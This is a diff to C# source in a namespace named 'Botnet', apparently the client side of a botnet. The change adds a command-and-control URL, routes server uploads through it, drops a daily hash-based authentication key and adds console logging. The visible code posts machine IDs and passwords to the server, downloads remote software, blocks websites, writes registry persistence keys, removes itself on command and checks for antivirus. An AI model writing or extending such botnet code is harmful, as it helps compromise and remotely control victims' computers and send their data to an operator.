@@ -42,6 +42,7 @@ namespace Botnet
         public static RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(registryKeyURI, true);
         //SERVER
         public static string BASE_URL = "http://localhost/";
+        public static string C2_URL = BASE_URL + "/c2";
         public static string SOFTWARE_REMOTE_DIR = BASE_URL + "software/";
         public static string REMOTE_WEBSITES_TO_BLOCK_FILE = BASE_URL + "hosts.txt";
         public static int noInternetWait = 5000;
@@ -83,18 +84,21 @@ namespace Botnet
 
         public static bool IsInternetAvailable()
         {
+            Console.WriteLine("Checking for internet connection...");
             try
             {
                 using (WebClient webClient = new WebClient())
                 {
                     using (webClient.OpenRead("http://clients3.google.com/generate_204"))
                     {
+                        Console.WriteLine("Connection detected!");
                         return true;
                     }
                 }
             }
             catch (Exception e)
             {
+                Console.WriteLine("No connection detected!");
                 Console.WriteLine(e.StackTrace);
                 return false;
             }
@@ -104,10 +108,10 @@ namespace Botnet
         {
             while (!IsInternetAvailable())
             {
+                Console.WriteLine("No connection detected. Sleeping for " + noInternetWait + " seconds...");
                 Thread.Sleep(noInternetWait);
             }
         }
-
 
         public static string RandomAlphanumeric()
         {
@@ -116,7 +120,7 @@ namespace Botnet
 
         public static string ServerCommunication(NameValueCollection formData)
         {
-            formData.Add("key", GenerateKey());
+            Console.WriteLine("Sending communication to server: " + formData);
             byte[] responseBytes;
             while (true)
             {
@@ -125,13 +129,13 @@ namespace Botnet
                     using (WebClient webClient = new WebClient())
                     {
                         webClient.Encoding = Encoding.UTF8;
-                        responseBytes = webClient.UploadValues(BASE_URL, "POST", formData);
+                        responseBytes = webClient.UploadValues(C2_URL, "POST", formData);
                     }
                     return Encoding.UTF8.GetString(responseBytes);
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                     WaitForInternet();
                 }
             }
@@ -139,7 +143,7 @@ namespace Botnet
 
         public static void DownloadFile(string url, string path)
         {
-
+            Console.WriteLine("Downloading file at URI [" + url + "] and saving at [" + path + "]");
             url = Uri.EscapeUriString(url);
             bool done = false;
             while (!done)
@@ -174,7 +178,6 @@ namespace Botnet
                             webClient.Headers.Add("Content-Type", "binary/octet-stream");
                             NameValueCollection nvc = new NameValueCollection
                             {
-                                ["key"] = GenerateKey(),
                                 ["operation"] = operation,
                                 ["machineID"] = GetMachineID(),
                                 ["password"] = GetPassword(),
@@ -287,6 +290,7 @@ namespace Botnet
 
         public static void ConfirmUninstallationToServer()
         {
+            Console.WriteLine("Confirming uninstallation to server...");
             NameValueCollection formData = new NameValueCollection
             {
                 ["operation"] = UNINSTALLED,
@@ -393,11 +397,6 @@ namespace Botnet
             return new Version(version);
         }
 
-        public static string GenerateKey()
-        {
-            return ComputeSha256Hash(DateTime.UtcNow.ToString("yyyy-MM-dd") + "_d4mny0uf0undm3!!!");
-        }
-
         public static string ComputeSha256Hash(string rawData)
         {
             using (SHA256 sha256Hash = SHA256.Create())
@@ -419,10 +418,12 @@ namespace Botnet
 
         public static void DeleteDirectory(string path)
         {
+            Console.WriteLine("Deleting directory: " + path);
             if (Directory.Exists(path))
             {
                 RecursivelyDeleteDirectory(path);
             }
+            Console.WriteLine("Directory deleted.");
         }
 
         private static void RecursivelyDeleteDirectory(string path)
@@ -450,12 +451,14 @@ namespace Botnet
 
         public static void AddRegistryKey(string keyName, string value)
         {
+            Console.WriteLine("Set registry key: " + keyName + " -> " + value);
             registryKey.SetValue(keyName, value);
         }
 
         public static void DeleteRegistryKey(string keyName)
         {
-            //TODO fix null pointer
+            Console.WriteLine("Delete registry key: " + keyName);
+            // FIXME: nullpointer
             if (registryKey.GetValue(keyName) != null)
                 try
                 {
@@ -470,6 +473,7 @@ namespace Botnet
 
         public static void Uninstall()
         {
+            Console.WriteLine("Uninstalling...");
             ConfirmUninstallationToServer();
             DeleteDirectory(mainDir);
             DeleteRegistryKey(registryKeyUpdater);
@@ -485,7 +489,7 @@ namespace Botnet
         }
 
 
-        public static bool AntivirusInstalled()
+        public static bool IsAntivirusInstalled()
         {
             // TEST
             /*
